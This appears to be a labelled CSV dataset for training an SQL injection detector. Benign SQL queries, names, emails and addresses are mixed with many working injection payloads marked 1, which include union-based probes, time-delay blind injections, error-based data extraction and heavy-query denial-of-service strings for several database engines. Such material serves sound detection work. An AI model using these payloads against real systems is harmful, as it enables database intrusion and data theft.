Query,Label
SELECT * FROM tail WHERE off NOT LIKE 'born%',0
SELECT * FROM dust WHERE against BETWEEN means09/01/1996massage AND cream15/31/1996variety,0
c09so18,0
"  SELECT Orders.strongerrID, Employees.usual, Employees.tobacco FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.metID ORDER BY Orders.taskID",0
a2o2e5,0
SELECT nation ( s ) FROM spend INNER JOIN,0
"  SELECT Orders.tentrID, Employees.wish, Employees.possibly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seasonID ORDER BY Orders.declaredID",0
handy.leleu@chevrolet-volt.gob,0
SELECT COUNT ( DISTINCT breeze )  FROM mean,0
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dnmi"" like ""dnmi",1
SELECT AVG ( past ) FROM they SELECT SUM ( color ) ,0
"-8129'   )    )     )   union all select 4531,4531,4531#",1
"   SELECT clearly, popular, stoveFROM clear WHERE excited  IS NOT NULL",0
SELECT * FROM shore,0
SELECT * FROM needle WHERE store = 'instance' FETCH FIRST 3 ROWS ONLY,0
"-5211""   )    )    as bkvr where 4082  =  4082 or 2323  =  8052",1
"1""   )    )    as gvpm where 5170  =  5170 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM down 3 SELECT * FROM applied,0
baladora,0
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0
" SELECT * FROM hollow ORDER BY room, does",0
SELECT suggest ( s )  FROM attention SELECT range FROM dream,0
"1""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT AVG ( Price ) FROM his,0
"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
75771832b,0
barruecopardo,0
"INSERT INTO desk ( hidden, atomic, lift, subject, noon, second )  VALUES  ( 'fed', 'badly'. sure', 'word', 'alive', 'first', 'yesterday' )  ",0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,1
flor chino,0
" SELECT column_name ( s )  FROM laid,life",0
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh",1
"1'  )   as najc where 5213  =  5213 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
1  )   as jmib where 8130  =  8130 rlike   (  select   (  case when   (  7885  =  3932  )   then 1 else 0x28 end   )    )   --,1
95868852e,0
"  SELECT joy,hunter,plastic FROM mission LEFT JOIN Orders ON child.finallyID =  corner.empty ORDER BY library.after",0
SELECT * FROM mass WHERE mental NOT LIKE '[mysterious]%',0
9.47299E+15,0
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'esma' like 'esma",1
96277205x,0
SELECT Count ( * )  AS cutting,0
 (  select   (  case when   (  6581  =  6581  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1
bechara,0
31640,0
SELECT YEAR ( CURDATE (   )  )  ;,0
" select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",1
SELECT Count ( * )  AS reach,0
"SELECT DATE_SUB ( ""2017-06-15 09:34:21"", INTERVAL 3 HOUR ) ;",0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
villalobar de rioja,0
SELECT * FROM manner  WHERE belt NOT LIKE '[written]%',0
1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  #,1
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs",1
barrera medio,0
SELECT * FROM  ( SELECT oxygen FROM shells ) ,0
anything' OR 'x'  =  'x,1
1'  )   as bzem where 4240  =  4240,1
recabdador,0
"1""  )   where 1300  =  1300 order by 1#",1
-9100  )   or 8792  =  9550--,1
SELECT * FROM happened WHERE rice = 'giant',0
SELECT * FROM bottle WHERE hearing = 'careful'  AND  ( number = 'table' OR excited = 'consist' ) ,0
"  SELECT REVERSE ( ""SQL Tutorial"" ) ;",0
" SELECT * FROM outside ORDER BY move, pink",0
1'+  (  select basp where 6953  =  6953,1
SELECT * FROM cloth WHERE jungle = 'lonely' LIMIT 3,0
SELECT UCASE ( CustomerName )  AS UppercaseCustomerName FROM Customers;,0
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1
7.20299E+15,0
select   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  select 4341 from mysql.db  )   end  )  #,1
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",1
SELECT * FROM gold WHERE letter IN  ( SELECT spin FROM bare ) ,0
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1
"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",1
"1""   )    )    union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM expect WHERE nest BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM then WHERE NOT gravity = 'between'  AND NOT another = 'pack',0
1  )   and sleep  (  5  ) ,1
SELECT AVG ( plan ) FROM aboard,0
"   SELECT remove, per, handFROM consist WHERE twenty  IS NOT NULL",0
"1""  )   where 9062  =  9062",1
"1%'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1
SELECT * FROM bar WHERE Price NOT BETWEEN 10 AND 20,0
"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367676 )  ORDER BY meta_id ASC",0
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
SELECT MIN ( tell )  AS difference FROM detail,0
"-2803""  )   union all select 5337,5337,5337,5337,5337,5337,5337#",1
kazuo,0
"1""  )   where 8953  =  8953 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,1
stiller_kimball@socimi.com.ic,0
ralf,0
 or 1  =  1,1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367656 ) ,0
taboada,0
SELECT TOP 3 * FROM ago SELECT * FROM found 3SELECT * FROM mostly,0
thomasin,0
cartaa,0
"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
15953,0
"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1
SELECT COUNT ( DISTINCT dried )  FROM put,0
"1%'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM sheet WHERE NOT third = 'mean'  AND NOT sort = 'likely',0
1'  )   rlike sleep  (  5  )  #,1
4.03E+15,0
"1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,1
SELECT * FROM something WHERE stock = 'let'  AND  ( take = 'hearing' OR engine = 'ants' ) ,0
"1   )    )    union all select null,null,null,null,null--",1
zangn,0
"  SELECT Orders.opportunityrID, Employees.oxygen, Employees.heard FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.findID ORDER BY Orders.windowID",0
SELECT something FROM completely UNION ALL SELECT broken FROM welcome ORDER BY lamp,0
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
04607227m,0
5854,0
"  SELECT vapor AS flew, dog AS [cent]  FROM her",0
DELETE FROM cloud WHERE happy = 'wash',0
"  SELECT fox AS north, ahead AS [each]  FROM office",0
1   )    )    as lkqx where 6468  =  6468 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
5130,0
select   (  case when   (  3681  =  5026  )   then 3681 else 3681*  (  select 3681 from information_schema.character_sets  )   end  )  #,1
select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,1
"1%""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
fregaci5n,0
santo,0
SELECT arrangement ( s )  FROM ocean FULL OUTER JOIN,0
"-2178'   )    )     )   or elt  (  3421  =  2899,2899  )   and    (    (     (  'jdst'  =  'jdst",1
 or uid like '%,1
SELECT * FROM built WHERE hard LIKE '%lay%',0
-7552 or 6872  =  6872,1
5.861E+15,0
SELECT whose ( s )  FROM hat,0
bollullos par del condado,0
 UPDATE collect SET couple = 'battle'WHERE bigger = 'earth',0
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'uzmy' like 'uzmy,1
"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_1_text' LIMIT 1,0
SELECT * FROM addition FETCH FIRST 3 ROWS ONLY,0
-8504 where 3086  =  3086 or 1131  =  9188#,1
SELECT * FROM wave,0
7.69444E+15,0
"1'||  (  select 'vwop' where 8536  =  8536 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""   )    )    as tngu where 3644  =  3644 union all select null--",1
SELECT * FROM common ORDER BY should DESC,0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",1
leiding@ubuybetter.cat,0
"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",1
9ara,0
SELECT * FROM living,0
SELECT Count ( * )  AS remember,0
SELECT * FROM company WHERE center  BETWEEN 10 AND 20,0
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",1
"1,  (  case when 6620  =  3092 then 1 else null end  )  ",1
"1"" where 1234  =  1234",1
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",1
SELECT dish ( s )  FROM jet,0
SELECT AVG ( sit ) FROM terrible SELECT SUM ( mass ) ,0
"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",1
SELECT * FROM wp_posts WHERE ID  =  347687 LIMIT 1,0
"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,1
"  SELECT grow AS chair, film AS [fly]  FROM breakfast",0
"carretera aeropuerto, 42,",0
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe",1
-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,1
 UPDATE choose SET promised = 'curve'WHERE ocean = 'social',0
05636576n,0
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,1
1'  )   as tqdg where 9355  =  9355,1
92106863m,0
cabada ferrus,0
29283698y,0
SELECT native FROM independent UNION SELECT moon FROM ride ORDER BY snow,0
SELECT * FROM should WHERE spell BETWEEN '1996-07-01' AND '1996-07-31',0
"1   )    )    as pjjz where 8384  =  8384 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
WHERE Country IN  ( SELECT Country FROM Suppliers ) ;,0
SELECT AVG ( direct ) FROM scared,0
"1  )   as dqda where 1624  =  1624 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM vapor WHERE Price NOT BETWEEN 10 AND 20,0
  )   or   (  'x'  =  'x,1
SELECT * FROM building WHERE saw IN  ( SELECT general FROM lift ) ,0
"SELECT * FROM real WHERE evidence BETWEEN ""complex"" AND    ""whether""",0
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
SELECT TOP 3 * FROM separate WHERE discover = 'solution' SELECT * FROM income,0
"-7543'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
rudisill8,0
"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
46724,0
"   SELECT COUNT ( meal ) , wonder FROM primitive BY tall",0
"SELECT * FROM courage WHERE railroad BETWEEN ""dangerous"" AND    ""nice""",0
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss",1
"1%'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1
"-1844"" where 7948  =  7948 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1' and sleep  (  5  )   and 'pfgy'  =  'pfgy,1
SELECT * FROM three ORDER BY dozen DESC,0
hawker-wiese7@tradora.mg,0
SELECT * FROM location WHERE stopped  BETWEEN 10 AND 20,0
"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT COUNT ( represent )  FROM purple,0
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT * FROM science WHERE blood NOT BETWEEN 'raise' AND 'shaking',0
alfonso,0
9540,0
"  SELECT soundID AS ID, blue AS view FROM information",0
pires arajol,0
manducatoria,0
"aldebaran 84,",0
"calle robert gerhard, s/n 6c",0
"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",1
96305711l,0
maughan@enfuerteventura.com.rw,0
"calle garci-perez 41, 9?c",0
claudiano,0
braddell@cincocolores.cat,0
SELECT hundred ( s )  FROM sort LEFT JOIN,0
granfiel,0
SELECT * FROM will FETCH FIRST 3 ROWS ONLY,0
 UPDATE individual SET one = 'instance'WHERE dish = 'gift',0
SELECT * FROM stuck WHERE think = 'solid'  AND City = 'tears',0
"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",1
SELECT * FROM typical ORDER BY official,0
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
" select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",1
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",1
2isnomo,0
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1
"  SELECT name,driving FROM political WHERE sang = 'village' UNION SELECT wide, average FROM pictured",0
"SELECT * FROM rise WHERE balance BETWEEN ""beside"" AND    ""quickly""",0
DELETE FROM right WHERE gather = 'already',0
"alcalde baeza medina, s/n,",0
SELECT COUNT ( top ) FROM model,0
union select,1
"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow",1
 UPDATE moment SET sell = 'lay'WHERE trick = 'managed',0
whiskin,0
1%' waitfor delay '0:0:5'--,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",1
"INSERT INTO aboard  ( smallest, large, somehow )  VALUES  ( 'ready', 'maybe', 'element' )  ",0
43391,0
salina-sonajew@almeriastella.vg,0
"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""hbfr"" like ""hbfr",1
"1%'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   '%'  =  '",1
" SELECT * FROM certain ORDER BY judge, dinner",0
SELECT AVG ( rubbed ) FROM original,0
1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',1
sylvia,0
1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
SELECT TOP 3 * FROM ran,0
regir,0
SELECT particular ( s )  FROM smoke SELECT whatever FROM tried,0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",1
" SELECT * FROM cup ORDER BY tobacco, several",0
albeta,0
SELECT although FROM order UNION SELECT over FROM single ORDER BY third,0
SELECT getting,0
a79ga44,0
2.1902E+15,0
SELECT TOP 3 * FROM limited SELECT * FROM wave 3SELECT * FROM cent,0
21924971z,0
SELECT * FROM accept WHERE shells = 'beautiful',0
5.84996E+15,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 27990 )  ORDER BY meta_id ASC",0
SELECT TOP 3 * FROM drink WHERE house = 'rear' SELECT * FROM himself,0
SELECT AVG ( except )  FROM speak  SELECT SUM ( sang ) ,0
SELECT * FROM fog WHERE square  BETWEEN 10 AND 20,0
SELECT * FROM  ( SELECT together FROM here ) ,0
" SELECT * FROM positive ORDER BY human ASC, pleasure DESC",0
-9739' or 8571  =  8571--,1
laurencia,0
SELECT * FROM suit 3 SELECT * FROM blue,0
SELECT * FROM equally 3,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",1
"   SELECT paint, swimming, labor FROM wire WHERE closely  IS NULL",0
"-3555'  )   or make_set  (  9354  =  9354,7185  )   and   (  'papr'  =  'papr",1
"   SELECT uncle, studying, jumpFROM for WHERE from  IS NOT NULL",0
"iif  (  5257  =  5257,1,1/0  )  ",1
SELECT * FROM climate 3,0
-8045   )    )     )   order by 1--,1
"paraje antonio de nebrija 39,",0
otao suaso,0
"1%""   )    )     )   union all select null,null,null--",1
SELECT * FROM distance FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM see,0
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",1
5986,0
"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'luoj'  =  'luoj",1
"   SELECT Employees.grade, COUNT ( Orders.fineID )  AS chemicalFROM    ( OrdersINNER JOIN growth ON Orders.thenID  =  Employees.aloneID ) ",0
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",1
hasan,0
"1""  )   as jrse where 9185  =  9185 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
